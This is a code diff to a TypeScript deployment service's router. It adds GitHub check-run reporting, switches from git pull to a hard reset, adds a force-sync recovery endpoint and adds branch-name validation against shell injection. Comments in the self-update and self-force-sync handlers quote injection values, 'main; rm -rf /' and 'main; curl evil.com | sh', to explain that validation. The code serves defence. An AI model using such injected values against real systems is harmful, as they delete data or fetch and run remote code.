@@ -19,6 +19,9 @@ import { combinedOutput } from '../types.js';
 import { topoSortLayers } from '../services/topo-sort.js';
 import { detectStack } from '../services/stack-detector.js';
 import { assertProjectAccess } from './projects.js';
+import { CheckRunRunner } from '../services/check-run-runner.js';
+import { GitHubAppClient } from '../services/github-app-client.js';
+import { isSafeGitRef } from '../services/github-webhook-dispatcher.js';
 
 /**
  * P4 Part 18 (hardening): pre-restart sanity check for self-update.
@@ -97,6 +100,12 @@ export interface RouterDeps {
    * Defaults to `least-load` if not provided.
    */
   getClusterStrategy?: () => 'least-branches' | 'least-load' | 'round-robin';
+  /**
+   * Optional GitHubAppClient — when provided, deploys post "CDS Deploy"
+   * check runs back to GitHub so the PR's Checks panel mirrors CDS's
+   * build status. Absent when CDS_GITHUB_APP_* env vars aren't set.
+   */
+  githubApp?: GitHubAppClient;
 }
 
 export function createBranchRouter(deps: RouterDeps): Router {
@@ -109,9 +118,16 @@ export function createBranchRouter(deps: RouterDeps): Router {
     schedulerService,
     registry,
     getClusterStrategy,
+    githubApp,
   } = deps;
 
   const router = Router();
+
+  const checkRunRunner = new CheckRunRunner({
+    stateService,
+    githubApp,
+    config,
+  });
 
   // ── Cluster dispatch helper ──
   //
@@ -1007,10 +1023,43 @@ export function createBranchRouter(deps: RouterDeps): Router {
         if (svc.errorMessage) svc.errorMessage = undefined;
       }
       entry.status = 'building';
+
+      // ── GitHub Checks integration ──
+      // Priority for the commit SHA fed to the check run:
+      //   1. req.body.commitSha — the authoritative value from the
+      //      webhook-originated dispatcher, pinned at webhook-handling
+      //      time so concurrent pushes can't race it
+      //   2. entry.githubCommitSha — stored on the branch by the push
+      //      handler (same value in the normal flow)
+      //   3. current worktree HEAD — fallback for UI-triggered deploys
+      // If none of the above resolve, the check-run path is a no-op.
+      const bodyCommitSha = typeof req.body?.commitSha === 'string'
+        && /^[0-9a-f]{7,40}$/i.test(req.body.commitSha)
+        ? req.body.commitSha : undefined;
+      if (bodyCommitSha) {
+        entry.githubCommitSha = bodyCommitSha;
+      } else if (entry.githubRepoFullName && !entry.githubCommitSha) {
+        try {
+          const sha = await shell.exec('git rev-parse HEAD', { cwd: entry.worktreePath });
+          if (sha.exitCode === 0) {
+            entry.githubCommitSha = sha.stdout.trim();
+          }
+        } catch {
+          /* non-fatal — check run just won't fire */
+        }
+      }
       stateService.save();
+      // Open an in-progress check run — best effort, errors logged not
+      // thrown (so GitHub connectivity issues don't block the deploy).
+      await checkRunRunner.ensureOpen(entry);
 
       // Pull latest code
       logEvent({ step: 'pull', status: 'running', title: '正在拉取最新代码...', timestamp: new Date().toISOString() });
+      await checkRunRunner.progress(entry, {
+        title: '拉取最新代码…',
+        summary: `分支: \`${entry.branch}\`\n阶段: git fetch + reset`,
+        force: true,
+      });
       const pullResult = await worktreeService.pull(entry.branch, entry.worktreePath);
       logEvent({ step: 'pull', status: 'done', title: `已拉取: ${pullResult.head}`, detail: pullResult as unknown as Record<string, unknown>, timestamp: new Date().toISOString() });
 
@@ -1072,13 +1121,23 @@ export function createBranchRouter(deps: RouterDeps): Router {
       stateService.save();
 
       // ── Execute layer by layer (parallel within each layer) ──
-      for (const layer of layers) {
+      for (let layerIdx = 0; layerIdx < layers.length; layerIdx++) {
+        const layer = layers[layerIdx];
         const layerServiceNames = layer.items.map(p => p.name).join(', ');
         logEvent({
           step: `layer-${layer.layer}`,
           status: 'running',
           title: `启动第 ${layer.layer} 层: ${layerServiceNames}`,
           timestamp: new Date().toISOString(),
+        });
+        // Progress PATCH to GitHub so PR reviewers refreshing the Checks
+        // panel see "构建第 X/Y 层 (services...)" instead of a stale
+        // "Deploying to CDS…" for the entire build. Force=true so layer
+        // transitions always push even inside the 5s throttle window.
+        await checkRunRunner.progress(entry, {
+          title: `构建第 ${layerIdx + 1}/${layers.length} 层`,
+          summary: `分支 \`${entry.branch}\` 正在并行构建: ${layerServiceNames}`,
+          force: true,
         });
 
         const layerStartTime = Date.now();
@@ -1227,6 +1286,21 @@ export function createBranchRouter(deps: RouterDeps): Router {
         message: completeMsg,
         services: entry.services,
       });
+      // Finalize the GitHub check run (best-effort). `hasError` decides
+      // success vs failure; the preview URL surfaces in the check-run
+      // summary so GitHub's "Details" button jumps straight to preview.
+      // logTail = last 80 events rendered as "[status] step: title"
+      // lines, surfaced under "Show more" in GitHub's Checks panel.
+      await checkRunRunner.finalize(entry, {
+        conclusion: hasError ? 'failure' : 'success',
+        summary: completeMsg,
+        previewUrl: checkRunRunner.derivePreviewUrl(entry),
+        logTail: opLog.events.slice(-80).map((ev) => {
+          const st = ev.status || '?';
+          const ttl = ev.title || ev.step;
+          return `[${st}] ${ev.step}: ${ttl}`;
+        }).join('\n'),
+      });
     } catch (err) {
       entry.status = 'error';
       entry.errorMessage = (err as Error).message;
@@ -1236,6 +1310,16 @@ export function createBranchRouter(deps: RouterDeps): Router {
       stateService.save();
       logDeploy(id, `部署失败: ${(err as Error).message}`);
       sendSSE(res, 'error', { message: (err as Error).message });
+      await checkRunRunner.finalize(entry, {
+        conclusion: 'failure',
+        summary: (err as Error).message || '部署失败',
+        previewUrl: checkRunRunner.derivePreviewUrl(entry),
+        logTail: opLog.events.slice(-80).map((ev) => {
+          const st = ev.status || '?';
+          const ttl = ev.title || ev.step;
+          return `[${st}] ${ev.step}: ${ttl}`;
+        }).join('\n'),
+      });
     } finally {
       res.end();
     }
@@ -5342,6 +5426,17 @@ cdscli project list --human
 
       // Step 2: switch branch if specified
       if (branch) {
+        // Defense-in-depth: even though /api/self-update sits behind
+        // cookie/AI-key auth, an authenticated user supplying
+        // `branch='main; rm -rf /'` would otherwise run arbitrary
+        // commands. Reject shell-unsafe refs before they reach
+        // `shell.exec()`.
+        if (!isSafeGitRef(branch)) {
+          send('checkout', 'error', `拒绝不安全分支名: ${branch.slice(0, 80)}`);
+          sendSSE(res, 'error', { message: `不合法的分支名: ${branch}` });
+          res.end();
+          return;
+        }
         send('checkout', 'running', `正在切换到分支 ${branch}...`);
         // Use -f to discard tracked-file changes (safe: untracked files like .cds/state.json are untouched)
         const checkoutResult = await shell.exec(`git checkout -f ${branch}`, { cwd: repoRoot });
@@ -5368,11 +5463,46 @@ cdscli project list --human
         send('checkout', 'done', `已切换到 ${branch}`);
       }
 
-      // Step 3: pull latest
-      send('pull', 'running', '正在拉取最新代码...');
-      const pullResult = await shell.exec('git pull', { cwd: repoRoot });
-      const pullOutput = pullResult.stdout.trim();
-      send('pull', 'done', pullOutput.includes('Already up to date') ? '代码已是最新' : '代码已更新');
+      // Step 3: hard-reset local to the remote tip.
+      //
+      // Prior implementation used `git pull` which creates a merge commit
+      // when the local branch has diverged from origin. In managed CDS
+      // deployments divergence happens easily (e.g. a prior self-update
+      // left a locally-committed state, or the operator ran git commands
+      // on the host). An auto-merge can silently drop file changes — we
+      // actually hit this: settings.js grew by 438 lines on origin but
+      // pull's merge kept the local OLD version, serving stale UI.
+      //
+      // origin is the source of truth for a managed deployment, so we
+      // hard-reset to `origin/<branch>` after fetch. This is destructive
+      // to local uncommitted changes (checkout -f above already discards
+      // those) and to local-only commits (which shouldn't exist on a
+      // prod CDS anyway). For manual debugging branches, operators can
+      // still use `git reflog` to recover.
+      send('pull', 'running', '正在硬对齐到远端最新...');
+      const targetBranch = branch || (await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot })).stdout.trim();
+      // Guard the fallback branch too — a corrupted HEAD state could
+      // theoretically return something shell-unsafe (unlikely but the
+      // check costs nothing).
+      if (!isSafeGitRef(targetBranch)) {
+        send('pull', 'error', `拒绝不安全分支名: ${targetBranch.slice(0, 80)}`);
+        sendSSE(res, 'error', { message: `不合法的 target branch: ${targetBranch}` });
+        res.end();
+        return;
+      }
+      const resetResult = await shell.exec(
+        `git reset --hard origin/${targetBranch}`,
+        { cwd: repoRoot },
+      );
+      if (resetResult.exitCode !== 0) {
+        const errMsg = (resetResult.stderr || resetResult.stdout || '未知错误').trim();
+        send('pull', 'error', `硬对齐失败: ${errMsg}`);
+        sendSSE(res, 'error', { message: `无法对齐到 origin/${targetBranch}: ${errMsg}` });
+        res.end();
+        return;
+      }
+      const newHead = (await shell.exec('git rev-parse --short HEAD', { cwd: repoRoot })).stdout.trim();
+      send('pull', 'done', `已对齐到 origin/${targetBranch} @ ${newHead}`);
 
       // ──────────────────────────────────────────────────────────────
       // Step 3.5: pre-restart validation (P4 Part 18 hardening).
@@ -5499,6 +5629,174 @@ cdscli project list --human
         stage: 'unknown',
         error: (err as Error).message,
       });
+    }
+  });
+
+  // ─────────────────────────────────────────────────────────────────────
+  // POST /api/self-force-sync — recovery endpoint for divergent repos.
+  //
+  // When the CDS host's local git checkout has diverged from origin (e.g.
+  // a prior self-update silently merged, or an operator made a hot-patch
+  // commit), the regular /api/self-update can't recover because its
+  // `git pull` keeps creating merge commits that DROP remote changes.
+  // This endpoint is the escape hatch: hard-reset to origin + clear the
+  // dist/.build-sha cache so the next start recompiles from scratch +
+  // restart. Destructive to local commits, intentionally so.
+  //
+  // Streams SSE so the operator watching the UI gets real-time progress.
+  // ─────────────────────────────────────────────────────────────────────
+  router.post('/self-force-sync', async (req, res) => {
+    const { branch } = (req.body || {}) as { branch?: string };
+
+    initSSE(res);
+    const send = (step: string, status: string, title: string, extra?: Record<string, unknown>) => {
+      sendSSE(res, 'step', { step, status, title, timestamp: new Date().toISOString(), ...(extra || {}) });
+    };
+
+    try {
+      const repoRoot = config.repoRoot;
+      const cdsDir = path.join(repoRoot, 'cds');
+
+      // Step 1: fetch
+      send('fetch', 'running', '正在拉取远端 ref…');
+      const fetchRes = await shell.exec('git fetch --all --prune', { cwd: repoRoot, timeout: 60_000 });
+      if (fetchRes.exitCode !== 0) {
+        send('fetch', 'error', 'git fetch 失败: ' + (combinedOutput(fetchRes) || '').slice(0, 200));
+        sendSSE(res, 'error', { message: 'git fetch 失败' });
+        res.end();
+        return;
+      }
+      send('fetch', 'done', '远端 ref 已同步');
+
+      // Step 2: resolve target branch (use current if not supplied).
+      // Reject shell-unsafe refs up front — the endpoint is auth-gated
+      // but defense-in-depth against an attacker with a valid AI key
+      // crafting `branch='main; curl evil.com | sh'` is cheap.
+      let target = branch;
+      if (!target) {
+        const cur = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
+        target = cur.stdout.trim() || 'main';
+      }
+      if (!isSafeGitRef(target)) {
+        send('resolve', 'error', `拒绝不安全分支名: ${target.slice(0, 80)}`);
+        sendSSE(res, 'error', { message: `不合法的 branch: ${target}` });
+        res.end();
+        return;
+      }
+      send('resolve', 'done', '目标分支: ' + target);
+
+      // Step 3a: checkout target branch BEFORE the hard reset.
+      //
+      // Without this, calling with {branch:'develop'} while HEAD is on
+      // 'main' would `git reset --hard origin/develop` and move the
+      // CURRENT branch (main) to develop's commit — corrupting main's
+      // tracking. self-update does this right; we were missing it.
+      // Caught by Cursor Bugbot #450 round 7 (HIGH).
+      send('checkout', 'running', `切换到 ${target} 分支...`);
+      const coRes = await shell.exec(`git checkout -f ${target}`, { cwd: repoRoot, timeout: 30_000 });
+      if (coRes.exitCode !== 0) {
+        // Fallback: create tracking branch from origin if it doesn't exist
+        // locally yet (same dance self-update performs).
+        const fbRes = await shell.exec(`git checkout -f -b ${target} origin/${target}`, { cwd: repoRoot, timeout: 30_000 });
+        if (fbRes.exitCode !== 0) {
+          const errMsg = (combinedOutput(fbRes) || '未知错误').trim();
+          send('checkout', 'error', `切换失败: ${errMsg.slice(0, 200)}`);
+          sendSSE(res, 'error', { message: `无法切换到 ${target}: ${errMsg}` });
+          res.end();
+          return;
+        }
+      }
+      // Verify we actually ended up on the target branch — catch any
+      // silent checkout-succeeds-but-HEAD-elsewhere edge case.
+      const verify = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
+      const actual = verify.stdout.trim();
+      if (actual !== target) {
+        send('checkout', 'error', `切换未生效: 期望 ${target},实际 ${actual}`);
+        sendSSE(res, 'error', { message: `git checkout 未生效: 仍在 ${actual}` });
+        res.end();
+        return;
+      }
+      send('checkout', 'done', `已切到 ${target}`);
+
+      // Step 3b: hard-reset to origin/<target>
+      send('reset', 'running', `硬对齐 HEAD → origin/${target}`);
+      const resetRes = await shell.exec(`git reset --hard origin/${target}`, { cwd: repoRoot, timeout: 30_000 });
+      if (resetRes.exitCode !== 0) {
+        send('reset', 'error', 'reset 失败: ' + (combinedOutput(resetRes) || '').slice(0, 200));
+        sendSSE(res, 'error', { message: `git reset --hard origin/${target} 失败` });
+        res.end();
+        return;
+      }
+      const newHead = (await shell.exec('git rev-parse --short HEAD', { cwd: repoRoot })).stdout.trim();
+      send('reset', 'done', `HEAD = ${newHead}`, { commitHash: newHead });
+
+      // Step 4: drop dist build cache so next start recompiles.
+      send('cache', 'running', '清除 dist/.build-sha 编译缓存…');
+      const shaFile = path.join(cdsDir, 'dist', '.build-sha');
+      try {
+        if (fs.existsSync(shaFile)) {
+          fs.unlinkSync(shaFile);
+          send('cache', 'done', '已删除 .build-sha');
+        } else {
+          send('cache', 'done', '.build-sha 不存在, 跳过');
+        }
+      } catch (err) {
+        send('cache', 'warning', '删除 .build-sha 失败: ' + (err as Error).message);
+      }
+
+      // Step 5: validate new code compiles before restart.
+      send('validate', 'running', '预检: pnpm install + tsc --noEmit…');
+      const validation = await validateBuildReadiness(shell, cdsDir);
+      if (!validation.ok) {
+        send('validate', 'error', `预检失败: ${validation.error.slice(0, 300)}`);
+        sendSSE(res, 'error', {
+          message: `force-sync 已中止 — ${target} 的代码没过预检: ${validation.error}`,
+        });
+        res.end();
+        return;
+      }
+      send('validate', 'done', validation.summary);
+
+      // Step 6: restart via exec_cds.sh daemon spawn, exit after 1s.
+      send('restart', 'running', '正在重启 CDS…');
+      sendSSE(res, 'done', { message: `CDS 即将重启, HEAD=${newHead}`, commitHash: newHead });
+      res.end();
+
+      // Same restart technique as /api/self-update — spawn a detached bash
+      // that runs exec_cds.sh daemon and let the current process die after
+      // a short grace period so the child can bind the port.
+      const errorLogPath = path.join(cdsDir, '.cds', 'self-update-error.log');
+      try {
+        fs.mkdirSync(path.dirname(errorLogPath), { recursive: true });
+        fs.appendFileSync(
+          errorLogPath,
+          `\n=== self-force-sync spawn at ${new Date().toISOString()} (branch=${target}) ===\n`,
+        );
+        const out = fs.openSync(errorLogPath, 'a');
+        const errFd = fs.openSync(errorLogPath, 'a');
+        const child = spawn('bash', ['./exec_cds.sh', 'daemon'], {
+          cwd: cdsDir,
+          detached: true,
+          stdio: ['ignore', out, errFd],
+          env: { ...process.env },
+        });
+        child.on('error', (err) => {
+          fs.appendFileSync(errorLogPath, `spawn error: ${err.message}\n`);
+        });
+        child.unref();
+        setTimeout(() => process.exit(0), 1000);
+      } catch (spawnErr) {
+        // If we can't spawn the replacement, at least we've persisted the
+        // reset — operator can manually `./exec_cds.sh restart` afterwards.
+        try {
+          fs.appendFileSync(errorLogPath, `pre-spawn error: ${(spawnErr as Error).message}\n`);
+        } catch {
+          /* ignore */
+        }
+      }
+    } catch (err) {
+      sendSSE(res, 'error', { message: (err as Error).message });
+      try { res.end(); } catch { /* already ended */ }
     }
   });
 
